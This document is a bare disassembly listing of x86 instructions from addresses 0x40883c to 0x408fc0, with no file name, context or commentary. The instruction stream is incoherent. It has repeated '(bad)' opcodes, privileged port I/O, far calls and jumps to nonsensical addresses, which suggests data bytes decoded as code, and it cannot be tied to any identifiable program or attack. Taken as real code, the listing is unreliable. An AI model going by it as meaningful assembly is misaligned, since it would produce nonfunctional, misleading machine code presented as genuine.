  40883c:	and    ecx,DWORD PTR fs:[ebx+0x1d82b0a0]
  408843:	(bad)  
  408844:	cwde   
  408845:	push   ebp
  408846:	fnstsw WORD PTR [eax-0x751a6e2b]
  40884c:	lods   al,BYTE PTR ds:[esi]
  40884d:	xor    dl,ah
  40884f:	out    dx,al
  408850:	or     edi,ecx
  408852:	in     al,0xe1
  408854:	fld    TBYTE PTR [ebp-0x569a76f0]
  40885a:	nop
  40885b:	inc    ebx
  40885c:	je     0x4088ae
  40885e:	or     bh,ah
  408860:	adc    esi,DWORD PTR [eax-0x6a]
  408863:	retf   
  408864:	lea    ecx,[edx-0x7f]
  408867:	sub    BYTE PTR [esi],0xb5
  40886a:	sub    BYTE PTR [ebp+0x5289c9b6],bl
  408870:	jg     0x40889a
  408872:	lea    esp,[ebx+eax*4+0x66]
  408876:	pop    es
  408877:	test   al,0xe5
  408879:	sub    esp,DWORD PTR [ecx]
  40887b:	ins    DWORD PTR es:[edi],dx
  40887c:	push   ebx
  40887d:	dec    ebx
  40887e:	int    0x83
  408880:	mov    eax,0xfde529ad
  408885:	jmp    0xe0ebd601
  40888a:	popa   
  40888b:	test   cl,bh
  40888d:	xchg   esp,eax
  40888e:	(bad)  
  40888f:	nop
  408890:	out    0xf0,eax
  408892:	push   ebx
  408893:	sbb    DWORD PTR [esi+0x5ab03c64],0xffffffe3
  40889a:	push   0xffffffb0
  40889c:	shr    ebp,cl
  40889e:	outs   dx,DWORD PTR ss:[esi]
  4088a0:	sub    DWORD PTR [ebp+0x30],esp
  4088a3:	push   esp
  4088a4:	hlt    
  4088a5:	imul   esp,DWORD PTR [eax-0x68e494e4],0xd
  4088ac:	idiv   ah
  4088ae:	sti    
  4088af:	lahf   
  4088b0:	xor    DWORD PTR [ebp+0x630914f6],edi
  4088b6:	sbb    ebp,DWORD PTR [esi+0x7efe336b]
  4088bc:	adc    cl,BYTE PTR [esi+0x2]
  4088bf:	xor    eax,0xacfd3bd6
  4088c4:	lahf   
  4088c5:	pop    ecx
  4088c6:	(bad)  
  4088c7:	daa    
  4088c8:	aam    0x4e
  4088ca:	in     eax,0x91
  4088cc:	imul   esi,DWORD PTR [ebx],0xb90f8671
  4088d2:	aas    
  4088d3:	jmp    0x408872
  4088d5:	cmp    al,BYTE PTR [ebx+0x75fa83ae]
  4088db:	fsubp  st(1),st
  4088dd:	or     ecx,edi
  4088df:	scas   al,BYTE PTR es:[edi]
  4088e0:	(bad)  
  4088e2:	bound  eax,QWORD PTR [ebp+0x5aba57e4]
  4088e8:	cmp    DWORD PTR [ebx],0xed08d38b
  4088ee:	fimul  WORD PTR [eax]
  4088f0:	cld    
  4088f1:	xlat   BYTE PTR gs:[ebx]
  4088f3:	and    esi,DWORD PTR ds:0x7958d0cc
  4088f9:	xchg   DWORD PTR [ecx-0x2902fc94],eax
  4088ff:	mov    dl,BYTE PTR [edi-0x44]
  408902:	aaa    
  408903:	push   ebx
  408904:	pop    edx
  408905:	cmp    ebp,DWORD PTR [ecx+0x6]
  408908:	ds cld 
  40890a:	push   ecx
  40890b:	lods   eax,DWORD PTR ds:[esi]
  40890c:	mov    eax,ds:0x8d829328
  408911:	pop    edx
  408912:	ret    0xcf6
  408915:	mov    ch,0x56
  408917:	xor    eax,0xc5bc8f0e
  40891c:	call   0xb2c207e7
  408921:	mov    bl,BYTE PTR [eax]
  408923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408924:	out    0x3f,al
  408926:	dec    edi
  408927:	cmp    ah,BYTE PTR [eax-0x60a81a9]
  40892d:	ret    
  40892e:	mov    BYTE PTR [ecx+0x527b12e2],dl
  408934:	(bad)  
  408935:	adc    eax,0x8846b758
  40893a:	inc    esi
  40893b:	mov    edi,0xec1e6c49
  408940:	cwde   
  408941:	sbb    cl,bh
  408943:	pop    ss
  408944:	lahf   
  408945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408946:	rol    DWORD PTR ds:0x7c8adeb9,0xd3
  40894d:	push   ebx
  40894e:	mov    ah,0x81
  408950:	mov    edx,0x9a8174a1
  408955:	into   
  408956:	mov    bh,0xd9
  408958:	jb     0x40899e
  40895a:	push   ds
  40895b:	ficom  WORD PTR [edx+eiz*4]
  40895e:	push   cs
  40895f:	sbb    ecx,DWORD PTR [esi*8+0x26180d4d]
  408966:	jae    0x408936
  408968:	jg     0x40899f
  40896a:	xchg   esi,eax
  40896b:	mov    dh,BYTE PTR [edi-0x59]
  40896e:	dec    eax
  40896f:	pushf  
  408970:	shl    DWORD PTR ds:0xbde50c42,0x6
  408977:	fsub   QWORD PTR [edi+0x6b]
  40897a:	int    0x7d
  40897c:	sub    esi,edi
  40897e:	dec    edx
  40897f:	pushf  
  408980:	aas    
  408981:	sbb    DWORD PTR [ebx],esp
  408983:	idiv   DWORD PTR [ebx-0x6c25a938]
  408989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40898a:	mov    es,ebx
  40898c:	(bad)  
  40898d:	sub    al,0xa0
  40898f:	cmp    DWORD PTR [eax-0x4],ebx
  408992:	cmp    DWORD PTR [eax],esp
  408994:	sub    BYTE PTR [ecx],dl
  408996:	xchg   edi,eax
  408997:	mov    cl,0xfb
  408999:	mov    edx,0x68719e88
  40899e:	data16 out 0x45,al
  4089a1:	push   ecx
  4089a2:	iret   
  4089a3:	cli    
  4089a4:	inc    esi
  4089a5:	cmp    al,0xa8
  4089a7:	retf   0x65e6
  4089aa:	inc    eax
  4089ab:	pop    ss
  4089ac:	mov    ah,0x69
  4089ae:	sbb    BYTE PTR [esi+ecx*2+0x40787373],cl
  4089b5:	ins    BYTE PTR es:[edi],dx
  4089b6:	sub    BYTE PTR [esi+0xa],ch
  4089b9:	(bad)  
  4089ba:	jmp    0x4089c8
  4089bc:	pop    ebx
  4089bd:	nop
  4089be:	xchg   ebp,eax
  4089bf:	sbb    BYTE PTR [ebp+0x6fa0e9e8],al
  4089c5:	and    bh,BYTE PTR [edi-0x41]
  4089c8:	inc    eax
  4089c9:	je     0x408961
  4089cb:	adc    bl,BYTE PTR [edx+0x60c51794]
  4089d1:	mov    esi,0xc2d2d642
  4089d6:	add    ch,BYTE PTR [ecx]
  4089d8:	jl     0x408a3b
  4089da:	cmp    BYTE PTR [ebx-0x72],ah
  4089dd:	push   0xfffffff4
  4089df:	and    eax,0xb7539c11
  4089e4:	mov    edx,0xa7d50a6e
  4089e9:	jmp    0x408992
  4089eb:	or     al,0xaf
  4089ed:	lahf   
  4089ee:	xor    bl,ah
  4089f0:	ins    DWORD PTR es:[edi],dx
  4089f1:	sti    
  4089f2:	out    0x51,al
  4089f4:	mov    ch,0xe1
  4089f6:	popa   
  4089f7:	sub    bh,BYTE PTR [ecx]
  4089f9:	cmp    ebx,ecx
  4089fb:	mov    WORD PTR [ecx+edx*8-0x36],fs
  4089ff:	push   ecx
  408a00:	je     0x408a28
  408a02:	xchg   ecx,eax
  408a03:	(bad)  
  408a04:	call   0x9100:0x61293444
  408a0b:	sub    BYTE PTR [esi],ah
  408a0d:	push   esp
  408a0e:	in     eax,dx
  408a0f:	cmp    DWORD PTR [edi+eax*2],ebx
  408a12:	sahf   
  408a13:	cdq    
  408a14:	xlat   BYTE PTR ds:[ebx]
  408a15:	ja     0x408a1c
  408a17:	sub    DWORD PTR [edi*1-0x5505768c],eax
  408a1e:	out    0x26,eax
  408a20:	fstp   QWORD PTR [ebx+0x53]
  408a23:	inc    eax
  408a24:	mov    ah,0x3a
  408a26:	fistp  QWORD PTR [ecx]
  408a28:	test   al,0x2e
  408a2a:	scas   eax,DWORD PTR es:[edi]
  408a2b:	push   DWORD PTR [esi+0x5a]
  408a2e:	test   eax,0xa1283e2a
  408a33:	or     dh,bh
  408a35:	inc    edi
  408a36:	(bad)  
  408a37:	cmp    BYTE PTR [ebx-0x27],bl
  408a3a:	cmp    BYTE PTR ds:0xc0c05195,al
  408a40:	xchg   edx,eax
  408a41:	dec    ebx
  408a42:	rol    BYTE PTR [ebp-0x3a],1
  408a45:	push   ecx
  408a46:	jmp    0x408aac
  408a48:	and    edx,esp
  408a4a:	rcr    BYTE PTR [edi+0x38],1
  408a4d:	pop    ecx
  408a4e:	pop    ebx
  408a4f:	rcr    DWORD PTR [edx-0x4a],cl
  408a52:	dec    eax
  408a53:	xor    BYTE PTR [ebp+0x51],ah
  408a56:	xlat   BYTE PTR ds:[ebx]
  408a57:	sub    ecx,esp
  408a59:	xlat   BYTE PTR ds:[ebx]
  408a5a:	mov    bh,BYTE PTR [edx-0x35]
  408a5d:	loope  0x408a41
  408a5f:	mov    dl,0x21
  408a61:	mov    ah,0x6c
  408a63:	test   al,0xa0
  408a65:	dec    ebx
  408a66:	les    ebx,FWORD PTR [ebp-0x473333e]
  408a6c:	and    BYTE PTR [esi],bh
  408a6e:	sbb    BYTE PTR [edi+0x5ff709b2],dl
  408a74:	inc    DWORD PTR [esp+ebx*1]
  408a77:	sub    BYTE PTR [edx-0x22],cl
  408a7a:	xchg   DWORD PTR [edi-0x58],ebx
  408a7d:	hlt    
  408a7e:	test   dl,bh
  408a80:	xor    ebp,DWORD PTR [ebp-0x2f]
  408a83:	cmp    cl,BYTE PTR [ebx]
  408a85:	test   eax,0xff67abad
  408a8a:	sbb    al,0xb5
  408a8c:	stos   BYTE PTR es:[edi],al
  408a8d:	or     DWORD PTR [eax+0x62c50a32],eax
  408a93:	xor    dl,BYTE PTR [ebp-0x63e6b33e]
  408a99:	into   
  408a9a:	in     al,0x57
  408a9c:	mov    edi,DWORD PTR [ebx-0x71]
  408a9f:	push   esi
  408aa0:	xchg   esp,eax
  408aa1:	and    edi,DWORD PTR [edi]
  408aa3:	cmp    eax,DWORD PTR [ebx+0x70]
  408aa6:	fs jp  0x408a49
  408aa9:	push   ecx
  408aaa:	mov    dh,0xb7
  408aac:	cs dec ebx
  408aae:	dec    eax
  408aaf:	call   0xcef:0x3d8e60d7
  408ab6:	jae    0x408a4c
  408ab8:	(bad)  
  408aba:	fsub   st(4),st
  408abc:	or     eax,0x830b447c
  408ac1:	fld    DWORD PTR ds:0x90cf45b1
  408ac7:	popa   
  408ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ac9:	int3   
  408aca:	fiadd  WORD PTR [edx-0x5b9b9f8c]
  408ad0:	jae    0x408a62
  408ad2:	xchg   DWORD PTR [esi+0x55],ebp
  408ad5:	enter  0xc0c,0x4e
  408ad9:	into   
  408ada:	xor    BYTE PTR ds:0x6c5f1c6d,al
  408ae0:	push   ecx
  408ae1:	push   eax
  408ae2:	out    0x31,al
  408ae4:	jae    0x408b28
  408ae6:	into   
  408ae7:	mov    bl,0xb7
  408ae9:	bound  esi,QWORD PTR [ebp-0x10]
  408aec:	pop    edi
  408aed:	(bad)  
  408aee:	in     eax,0x71
  408af0:	pusha  
  408af1:	leave  
  408af2:	fsub   QWORD PTR [ecx-0x4d]
  408af5:	mov    ch,0xcf
  408af7:	cmp    eax,0xad95a421
  408afc:	pop    ebp
  408afd:	pop    esp
  408afe:	xchg   ecx,eax
  408aff:	dec    edx
  408b00:	jne    0x408b2e
  408b02:	xchg   edi,eax
  408b03:	stos   BYTE PTR es:[edi],al
  408b04:	es cld 
  408b06:	ins    BYTE PTR es:[edi],dx
  408b07:	push   edi
  408b08:	ret    
  408b09:	push   edx
  408b0a:	inc    ebp
  408b0b:	mov    edi,0x3e29f9ae
  408b10:	sub    BYTE PTR [ebx+0x3b322fd],bl
  408b16:	ds sbb al,0x8b
  408b19:	mov    bl,0xf4
  408b1b:	xchg   esp,eax
  408b1c:	out    dx,eax
  408b1d:	popf   
  408b1e:	adc    al,0x94
  408b20:	hlt    
  408b21:	xchg   edi,eax
  408b22:	dec    edx
  408b23:	mov    bl,0xd7
  408b25:	add    eax,0xffa3d526
  408b2a:	pop    ebp
  408b2b:	add    BYTE PTR [edx+0x68],dl
  408b2e:	jmp    0x408b86
  408b30:	mov    ebx,0xa5142b0c
  408b35:	jno    0x408baf
  408b37:	lods   al,BYTE PTR ds:[esi]
  408b38:	cs jle 0x408b26
  408b3b:	jle    0x408b01
  408b3d:	test   DWORD PTR ds:0x4e09152,edi
  408b43:	or     eax,0xf464aba2
  408b48:	div    BYTE PTR [ebx]
  408b4a:	pusha  
  408b4b:	xor    bl,0xaa
  408b4e:	and    eax,0x189093aa
  408b53:	sbb    esi,0x58460e14
  408b59:	(bad)
  408b5d:	mov    ebx,0x4c3187f7
  408b62:	ins    BYTE PTR es:[edi],dx
  408b63:	and    eax,DWORD PTR [edx-0x6cbf00d0]
  408b69:	pop    ecx
  408b6a:	popf   
  408b6b:	mov    cl,BYTE PTR [edi-0x57]
  408b6e:	and    eax,0x9ddd57dc
  408b73:	push   ds
  408b74:	pop    ecx
  408b75:	add    edi,0x63
  408b78:	pop    ecx
  408b79:	dec    edx
  408b7a:	or     al,0x52
  408b7c:	push   ebp
  408b7d:	popf   
  408b7e:	int3   
  408b7f:	dec    eax
  408b80:	mov    edi,0x59740f46
  408b85:	jge    0x408b61
  408b87:	jnp    0x408b91
  408b89:	scas   al,BYTE PTR es:[edi]
  408b8a:	cmp    eax,0x17240cb6
  408b8f:	adc    eax,0x958ddb5d
  408b94:	lods   al,BYTE PTR ds:[esi]
  408b95:	and    esi,DWORD PTR [edx]
  408b97:	mov    al,0x35
  408b99:	cdq    
  408b9a:	cmp    al,BYTE PTR [edx]
  408b9c:	bound  edi,QWORD PTR [eax+edx*2+0x79cd7d63]
  408ba3:	xor    eax,ecx
  408ba5:	bound  edi,QWORD PTR [edi]
  408ba7:	jg     0x408bd9
  408ba9:	and    eax,0xb3610570
  408bae:	test   edi,0xd03e1db5
  408bb4:	push   0xffffff81
  408bb6:	in     eax,0x17
  408bb8:	aad    0xa6
  408bba:	pop    ecx
  408bbb:	das    
  408bbc:	loopne 0x408bf7
  408bbe:	in     eax,dx
  408bbf:	sbb    DWORD PTR [ecx-0x12],0x18
  408bc3:	outs   dx,DWORD PTR ds:[esi]
  408bc4:	mov    eax,ds:0x53e535ad
  408bc9:	dec    ebx
  408bca:	push   es
  408bcb:	leave  
  408bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bcd:	outs   dx,DWORD PTR ds:[esi]
  408bce:	or     eax,0xa7a081be
  408bd3:	cmp    al,0x3d
  408bd5:	mov    dl,0x6e
  408bd7:	sub    dh,bh
  408bd9:	sbb    eax,0xd308fb3f
  408bde:	push   cs
  408bdf:	repnz sti 
  408be1:	lods   eax,DWORD PTR ds:[esi]
  408be2:	cs es out dx,al
  408be5:	outs   dx,DWORD PTR ds:[esi]
  408be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be7:	jmp    0xc0796b08
  408bec:	fs jg  0x408c51
  408bef:	daa    
  408bf0:	mov    eax,ds:0xfd538de0
  408bf5:	dec    eax
  408bf6:	icebp  
  408bf7:	cmp    DWORD PTR [edx+ebp*8],ebp
  408bfa:	push   ebx
  408bfb:	arpl   WORD PTR [esi-0x4e],dx
  408bfe:	or     DWORD PTR [ecx+ebp*8-0x56],ebp
  408c02:	iret   
  408c03:	or     eax,0x953e198
  408c08:	fld    TBYTE PTR [ebx+0x56]
  408c0b:	stos   DWORD PTR es:[edi],eax
  408c0c:	add    ebx,DWORD PTR [ebx]
  408c0e:	pop    ebp
  408c0f:	inc    esi
  408c10:	sub    eax,0x9b7ff7c2
  408c15:	or     BYTE PTR [edx],0x73
  408c18:	sub    al,0x70
  408c1a:	sbb    BYTE PTR [edx-0xa],al
  408c1d:	cdq    
  408c1e:	pop    edx
  408c1f:	pop    ebx
  408c20:	sub    DWORD PTR [edi+0xab29cc1],ecx
  408c26:	xchg   BYTE PTR [ecx],al
  408c28:	pop    esp
  408c29:	out    0xf5,al
  408c2b:	and    al,0x7e
  408c2d:	pop    ebx
  408c2e:	loopne 0x408bb1
  408c30:	imul   esp,DWORD PTR [ebp+0x72],0x6a
  408c34:	cmp    eax,ecx
  408c36:	ja     0x408bbd
  408c38:	sbb    BYTE PTR [ebp-0x2085c4a3],bl
  408c3e:	fwait
  408c3f:	das    
  408c40:	repnz jecxz 0x408bc9
  408c43:	inc    ecx
  408c44:	dec    esi
  408c45:	cli    
  408c46:	paddb  mm6,mm3
  408c49:	push   es
  408c4a:	enter  0xe525,0x2b
  408c4e:	jmp    0xf04d5f0f
  408c53:	mov    ch,0x56
  408c55:	and    DWORD PTR [eax+edi*2-0x5ddbf394],ebx
  408c5c:	test   eax,0x4428d87b
  408c61:	add    ebp,edx
  408c63:	fnclex 
  408c65:	(bad)  
  408c66:	lea    ebp,[ecx-0x7388c683]
  408c6c:	in     al,0xa8
  408c6e:	pop    edi
  408c6f:	fld    st(2)
  408c71:	sub    BYTE PTR [ebx-0x69ab78a1],ch
  408c77:	xchg   ecx,eax
  408c78:	dec    ebx
  408c79:	or     BYTE PTR [eax+edi*4-0x69],bl
  408c7d:	out    0x72,al
  408c7f:	cmp    ch,BYTE PTR [eax]
  408c81:	mov    cl,0x51
  408c83:	mov    cl,0xb3
  408c85:	cmp    DWORD PTR [edx+eiz*2+0xd2cdc97],esi
  408c8c:	add    dh,BYTE PTR [ebx]
  408c8e:	shr    BYTE PTR [ecx+0x72],1
  408c91:	pop    edi
  408c92:	ror    DWORD PTR [edi-0x23],1
  408c95:	adc    al,0x85
  408c97:	and    DWORD PTR [eax-0x2e],edi
  408c9a:	cld    
  408c9b:	ja     0x408cb3
  408c9d:	add    cl,bh
  408c9f:	push   0xffffffd3
  408ca1:	jecxz  0x408c25
  408ca3:	add    BYTE PTR [esi],ch
  408ca5:	call   FWORD PTR cs:[edx]
  408ca8:	inc    eax
  408ca9:	cmp    al,0xa8
  408cab:	sar    DWORD PTR [ecx-0x1a12bc93],0x80
  408cb2:	xlat   BYTE PTR ds:[ebx]
  408cb3:	dec    ebx
  408cb4:	popf   
  408cb5:	fcmove st,st(3)
  408cb7:	int3   
  408cb8:	pop    ds
  408cb9:	loope  0x408c7b
  408cbb:	mov    ecx,0x7a06a743
  408cc0:	xchg   ebx,eax
  408cc1:	jno    0x408ca0
  408cc3:	mov    WORD PTR [ecx+0x76f1ae7d],?
  408cc9:	xchg   ecx,eax
  408cca:	ins    BYTE PTR es:[edi],dx
  408ccb:	mov    eax,ds:0xff05596f
  408cd0:	push   cs
  408cd1:	push   0x4c1498e8
  408cd6:	pop    es
  408cd7:	mov    esi,0x97cc7266
  408cdc:	pop    edi
  408cdd:	ins    BYTE PTR es:[edi],dx
  408cde:	mov    bh,BYTE PTR [ecx+ebp*4]
  408ce1:	xchg   BYTE PTR [ebp+0x44],dh
  408ce4:	sub    edi,edx
  408ce6:	pop    ds
  408ce7:	lea    esi,[eax-0x66d5197f]
  408ced:	mov    dl,BYTE PTR [ebx+0x23]
  408cf0:	ret    
  408cf1:	fdiv   QWORD PTR [ebx+0x48]
  408cf4:	sbb    eax,0xa08633eb
  408cf9:	cmp    DWORD PTR [ecx],edi
  408cfb:	icebp  
  408cfc:	add    al,BYTE PTR [edi]
  408cfe:	pop    ebx
  408cff:	jns    0x408cf4
  408d01:	sbb    ch,BYTE PTR [ecx+eax*8-0x52]
  408d05:	popa   
  408d06:	je     0x408d47
  408d08:	cwde   
  408d09:	stc    
  408d0a:	sub    edx,DWORD PTR [edx-0x702d8872]
  408d10:	out    0x31,al
  408d12:	mov    eax,0xe32df179
  408d17:	(bad)  
  408d18:	popaw  
  408d1a:	les    esi,FWORD PTR ds:0xdde793e8
  408d21:	pop    ss
  408d22:	seto   ah
  408d25:	in     eax,0x7e
  408d27:	ret    0x604d
  408d2a:	mov    al,0xb9
  408d2c:	imul   ecx,DWORD PTR [edi],0x76466ad3
  408d32:	hlt    
  408d33:	out    dx,eax
  408d34:	jne    0x408d8f
  408d36:	mov    dl,0x66
  408d38:	shr    BYTE PTR [edi],0x18
  408d3b:	retf   
  408d3c:	adc    eax,0x83c90327
  408d41:	inc    ecx
  408d42:	and    dl,BYTE PTR [ebx-0x4]
  408d45:	sar    DWORD PTR [ebx+0x2a],0xa4
  408d49:	sub    cl,ch
  408d4b:	and    BYTE PTR [ebp-0x52e335ed],cl
  408d51:	push   cs
  408d52:	pop    ds
  408d53:	jb     0x408d6a
  408d55:	jb     0x408cd9
  408d57:	dec    ebx
  408d58:	and    al,BYTE PTR [esi-0x54]
  408d5b:	jb     0x408d02
  408d5d:	mov    DWORD PTR [ecx+0x43],0xdc336be4
  408d64:	mov    eax,ds:0x8551a4db
  408d69:	and    DWORD PTR [ebx-0x7d1e55bb],ebx
  408d6f:	push   edx
  408d70:	nop
  408d71:	jg     0x408d89
  408d73:	cld    
  408d74:	mov    ah,0x4c
  408d76:	pop    ebp
  408d77:	dec    eax
  408d78:	mov    DWORD PTR [ebx+0x31],esp
  408d7b:	das    
  408d7c:	pop    esi
  408d7d:	pop    ebp
  408d7e:	and    ecx,DWORD PTR ds:0x6d66e834
  408d84:	les    edx,FWORD PTR [eax-0x70]
  408d87:	cmp    BYTE PTR ss:[ebp+0x30d9f874],dl
  408d8e:	fidivr WORD PTR [edx+0x684b2a08]
  408d94:	jl     0x408e14
  408d96:	enter  0x570a,0xe6
  408d9a:	adc    ah,BYTE PTR [eax+edx*1+0x4c]
  408d9e:	or     al,0x8f
  408da0:	shl    dh,0xb6
  408da3:	or     BYTE PTR [ecx-0x33],dh
  408da6:	ss int 0x31
  408da9:	push   eax
  408daa:	repz adc eax,0xd80eaa6c
  408db0:	cli    
  408db1:	hlt    
  408db2:	hlt    
  408db3:	mov    ah,dh
  408db5:	pushf  
  408db6:	adc    BYTE PTR [edx],0xf1
  408db9:	sub    eax,0x5a9172e
  408dbe:	jb     0x408e0c
  408dc0:	imul   edi,edi,0x9c3d67e1
  408dc6:	push   ecx
  408dc7:	clc    
  408dc8:	mov    bh,0x4b
  408dca:	aam    0xd4
  408dcc:	inc    edi
  408dcd:	lea    ebx,[ebx]
  408dcf:	addr16 std 
  408dd1:	mov    eax,0x701fea10
  408dd6:	sub    DWORD PTR [ecx],ebx
  408dd8:	jnp    0x408d7d
  408dda:	sbb    DWORD PTR [ecx+eax*8-0x1c40426d],edi
  408de1:	pop    ebx
  408de2:	jge    0x408d93
  408de4:	adc    ebx,DWORD PTR [edi]
  408de6:	jp     0x408e45
  408de8:	scas   eax,DWORD PTR es:[edi]
  408de9:	push   0x13e80718
  408dee:	lods   al,BYTE PTR ds:[esi]
  408def:	shr    BYTE PTR [eax],0xf2
  408df2:	ins    DWORD PTR es:[edi],dx
  408df3:	jge    0x408e2e
  408df5:	(bad)
  408df9:	or     al,0x42
  408dfb:	daa    
  408dfc:	fcomp  DWORD PTR [ecx+ecx*1+0x5e8c3a76]
  408e03:	arpl   WORD PTR [ecx-0x5b],bp
  408e06:	dec    ebx
  408e07:	dec    ebx
  408e08:	out    dx,al
  408e09:	mov    esp,DWORD PTR [ebx+esi*8]
  408e0c:	push   esi
  408e0d:	(bad)  
  408e0e:	add    ch,BYTE PTR [eax+0x5ab7a29e]
  408e14:	pop    ecx
  408e15:	jnp    0x408e29
  408e17:	bound  edi,QWORD PTR [esi+0x4b]
  408e1a:	shl    BYTE PTR [ecx+0x7a0e310],cl
  408e20:	adc    al,0xb7
  408e22:	loopne 0x408e4d
  408e24:	nop
  408e25:	or     eax,0x9d2a7c65
  408e2a:	or     al,BYTE PTR [ecx]
  408e2c:	cmp    al,0x8
  408e2e:	dec    esp
  408e2f:	adc    al,ah
  408e31:	mov    dh,0xa6
  408e33:	push   edx
  408e34:	jecxz  0x408e33
  408e36:	outs   dx,BYTE PTR ds:[esi]
  408e37:	jae    0x408e76
  408e39:	into   
  408e3a:	std    
  408e3b:	sub    DWORD PTR [ebx+0xa],0x279b608a
  408e42:	call   0x29c8bf3d
  408e47:	adc    al,0x80
  408e49:	pop    ds
  408e4a:	stc    
  408e4b:	mov    ah,BYTE PTR [esi+0x40]
  408e4e:	aas    
  408e4f:	sbb    BYTE PTR [ebx],ah
  408e51:	loop   0x408e73
  408e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e54:	imul   esi,DWORD PTR [ecx+edi*8-0x5b],0x4
  408e59:	sahf   
  408e5a:	imul   ebx,DWORD PTR [edx+eiz*2],0x75ca7f18
  408e61:	in     al,0xc9
  408e63:	inc    ecx
  408e64:	dec    edx
  408e65:	jae    0x408eb0
  408e67:	retf   0x23b6
  408e6a:	inc    edi
  408e6b:	inc    ecx
  408e6c:	(bad)  
  408e6e:	and    eax,0xb1d5ccef
  408e73:	sbb    eax,0x5e78fc20
  408e78:	test   BYTE PTR [eax-0x29],al
  408e7b:	cdq    
  408e7c:	int    0xb5
  408e7e:	inc    ebp
  408e7f:	mov    ebp,0x97172624
  408e84:	sbb    BYTE PTR [ecx-0x12],cl
  408e87:	jle    0x408e8b
  408e89:	js     0x408e5b
  408e8b:	in     al,dx
  408e8c:	dec    edi
  408e8d:	aam    0x16
  408e8f:	pusha  
  408e90:	iret   
  408e91:	mov    esi,0xd8f82894
  408e96:	in     al,dx
  408e97:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  408e99:	cld    
  408e9a:	pop    eax
  408e9b:	sub    al,0x74
  408e9d:	mov    ch,ch
  408e9f:	or     BYTE PTR [edx],bl
  408ea1:	push   ecx
  408ea2:	call   0x468b:0x29ab6fae
  408ea9:	pusha  
  408eaa:	clc    
  408eab:	mov    ch,0xd5
  408ead:	pop    ds
  408eae:	pusha  
  408eaf:	movups xmm5,XMMWORD PTR [esi+0x7dbd75f5]
  408eb6:	ret    
  408eb7:	dec    eax
  408eb8:	mov    eax,0x61586e85
  408ebd:	ficom  DWORD PTR [ebx+0x3983054a]
  408ec3:	mov    ecx,0x5f6e4411
  408ec8:	gs dec ebp
  408eca:	jl     0x408f24
  408ecc:	cli    
  408ecd:	out    0x45,eax
  408ecf:	loop   0x408ec7
  408ed1:	xor    al,0xbc
  408ed3:	mul    DWORD PTR [ecx]
  408ed5:	jp     0x408f3e
  408ed7:	push   cs
  408ed8:	pop    ds
  408ed9:	sub    eax,0xcedda0bd
  408ede:	dec    ebx
  408edf:	mov    ebx,0xd193e9d3
  408ee4:	lahf   
  408ee5:	jl     0x408e79
  408ee7:	pop    edi
  408ee8:	in     al,dx
  408ee9:	mov    ebx,0x9e5b6ab2
  408eee:	and    DWORD PTR [edx+eax*4+0x6664791e],ebx
  408ef5:	aad    0xbe
  408ef7:	pop    esp
  408ef8:	clc    
  408ef9:	push   ebp
  408efa:	pop    esp
  408efb:	sbb    BYTE PTR [esi+edx*1],al
  408efe:	enter  0x9546,0xaf
  408f02:	xor    ecx,edx
  408f04:	ds xor al,0x3c
  408f07:	aaa    
  408f08:	les    eax,FWORD PTR [ecx+0x38]
  408f0b:	xor    eax,0x67bea47
  408f10:	jnp    0x408ea2
  408f12:	inc    esi
  408f13:	add    DWORD PTR [ecx-0x5f786890],ebp
  408f19:	dec    ebp
  408f1a:	stc    
  408f1b:	loop   0x408f07
  408f1d:	fucomi st,st(2)
  408f1f:	adc    dh,ah
  408f21:	shr    BYTE PTR [esi+0x1e],cl
  408f24:	fsubp  st(3),st
  408f26:	stos   DWORD PTR es:[edi],eax
  408f27:	stos   BYTE PTR es:[edi],al
  408f28:	es mov dl,0xb3
  408f2b:	loop   0x408f5d
  408f2d:	add    al,BYTE PTR [edx-0x4f]
  408f30:	mov    ch,0x26
  408f32:	jae    0x408f11
  408f34:	(bad)  
  408f35:	mov    dh,0x77
  408f37:	std    
  408f38:	cmp    al,0x17
  408f3a:	mov    ds:0xcb7eb9c3,al
  408f3f:	les    edx,FWORD PTR [edi+0x54]
  408f42:	jo     0x408fae
  408f44:	les    esp,FWORD PTR [ebx-0x13a2e1dc]
  408f4a:	pushf  
  408f4b:	and    al,0x9f
  408f4d:	cmp    al,0xec
  408f4f:	mov    ebx,0xe588cf7c
  408f54:	sahf   
  408f55:	push   ebp
  408f56:	mov    DWORD PTR [edi-0x65],ecx
  408f59:	mov    ds:0x12e6bc53,al
  408f5e:	xchg   edx,eax
  408f5f:	loopne 0x408f9a
  408f61:	ja     0x408fab
  408f63:	dec    eax
  408f64:	outs   dx,BYTE PTR ds:[esi]
  408f65:	xor    al,0xcb
  408f67:	ins    BYTE PTR es:[edi],dx
  408f68:	add    edx,DWORD PTR [esi+ecx*2]
  408f6b:	mov    ebp,0xebf63fb4
  408f70:	or     BYTE PTR [edi],ah
  408f72:	dec    ebx
  408f73:	jns    0x408f9e
  408f75:	in     eax,dx
  408f76:	fnstsw WORD PTR [ecx]
  408f78:	fisub  DWORD PTR [ecx-0x7c]
  408f7b:	push   es
  408f7c:	jns    0x408ffd
  408f7e:	push   edi
  408f7f:	jecxz  0x408fff
  408f81:	shl    ecx,1
  408f83:	bound  eax,QWORD PTR [esi-0x49]
  408f86:	fcmovnbe st,st(7)
  408f88:	or     eax,0xccbc629f
  408f8d:	mul    BYTE PTR [edx]
  408f8f:	or     eax,0x6f76f945
  408f94:	inc    esi
  408f95:	fcmovnu st,st(1)
  408f97:	mov    edi,0x1c61146b
  408f9c:	cs pusha 
  408f9e:	arpl   WORD PTR [edi],cx
  408fa0:	out    0x22,al
  408fa2:	push   esi
  408fa3:	push   eax
  408fa4:	adc    DWORD PTR [esi+0x5bb24bbe],0x2d
  408fab:	(bad)  
  408fac:	in     al,0x96
  408fae:	cwde   
  408faf:	lods   eax,DWORD PTR ds:[esi]
  408fb0:	out    0x94,eax
  408fb2:	(bad)  
  408fb3:	pop    ebx
  408fb4:	sub    bl,BYTE PTR [edi+0x6b]
  408fb7:	adc    al,0xc
  408fb9:	out    dx,al
  408fba:	sub    BYTE PTR [esi-0x4668ebf0],ch
  408fc0:	jge    0x408ff2
